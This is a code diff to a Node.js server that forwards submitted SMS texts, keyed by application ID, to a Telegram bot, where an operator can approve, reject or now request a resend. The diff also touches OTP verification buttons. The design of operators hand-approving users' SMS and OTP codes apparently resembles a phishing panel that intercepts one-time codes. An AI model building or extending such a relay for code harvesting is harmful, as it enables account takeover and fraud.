@@ -89,8 +89,11 @@ app.post('/api/verify-sms', async (req, res) => {
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: "✅ APPROVE SMS", callback_data: `approve_sms_${appId}` },
-                            { text: "❌ REJECT SMS", callback_data: `reject_sms_${appId}` }
+                            { text: "✅ APPROVE", callback_data: `approve_sms_${appId}` },
+                            { text: "❌ REJECT", callback_data: `reject_sms_${appId}` }
+                        ],
+                        [
+                            { text: "🔄 RESEND", callback_data: `resend_sms_${appId}` }
                         ]
                     ]
                 }
@@ -219,10 +222,14 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     applications[appId].smsStatus = 'approved';
                     newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ✅ *SMS APPROVED*`;
                     newStatus = "SMS Approved!";
-                } else {
+                } else if (action === 'reject') {
                     applications[appId].smsStatus = 'rejected';
                     newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: ❌ *SMS REJECTED*`;
                     newStatus = "SMS Rejected!";
+                } else if (action === 'resend') {
+                    applications[appId].smsStatus = 'resend';
+                    newText = `📩 *SMS RECEIVED* 📩\n\n*App ID:* \`${appId}\`\n\n*Message:*\n\`\`\`\n${applications[appId].smsText}\n\`\`\`\n\nStatus: 🔄 *RESEND REQUESTED*`;
+                    newStatus = "Resend Requested!";
                 }
             }
             // Handle OTP Verification Buttons
